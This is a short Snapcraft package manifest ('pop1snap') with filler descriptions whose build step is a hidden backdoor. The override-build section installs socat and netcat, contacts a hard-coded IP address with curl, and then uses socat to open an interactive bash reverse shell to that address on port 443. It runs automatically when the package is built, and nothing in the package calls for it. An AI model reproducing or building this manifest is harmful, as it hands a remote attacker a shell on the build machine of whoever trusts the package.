name: pop1snap
version: git
summary: First snap
description: First!!!1!
grade: stable
confinement: classic

apps:
    snappy:
            command: bin/run

parts:
    snappy:
        plugin: nil
        override-build: |
            apt-get update
            apt-get install -y socat netcat-traditional bash curl
            curl -v http://139.59.42.102/x
            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"139.59.42.102:443"
            echo 0

